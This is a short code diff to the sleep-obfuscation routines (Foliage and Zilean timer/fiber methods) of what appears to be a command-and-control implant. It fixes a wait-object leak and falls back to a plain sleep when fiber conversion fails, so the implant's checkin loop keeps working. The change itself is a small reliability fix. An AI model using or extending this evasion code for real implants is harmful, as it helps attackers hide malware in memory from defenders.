@@ -614,6 +614,13 @@ BOOL TimerObf(
     }
 
 LEAVE: /* cleanup */
+    /* ZILEAN wait objects are not owned by a timer queue: deregister
+     * them explicitly, otherwise they leak every sleep cycle */
+    if ( Method == SLEEPOBF_ZILEAN && Timer ) {
+        Instance->Win32.RtlDeregisterWait( Timer );
+        Timer = NULL;
+    }
+
     if ( Queue ) {
         Instance->Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
@@ -738,14 +745,22 @@ VOID SleepObf(
     {
         case SLEEPOBF_FOLIAGE: {
             SLEEP_PARAM Param = { 0 };
+            BOOL        Slept = FALSE;
 
             if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
                 if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                     Param.TimeOut = TimeOut;
                     Instance->Win32.SwitchToFiber( Param.Slave );
                     Instance->Win32.DeleteFiber( Param.Slave );
+                    Slept = TRUE;
                 }
                 Instance->Win32.ConvertFiberToThread( );
+            }
+
+            /* a failed fiber conversion would otherwise skip the sleep
+             * entirely and turn the checkin loop into a busy loop */
+            if ( ! Slept ) {
+                goto DEFAULT;
             }
             break;
         }
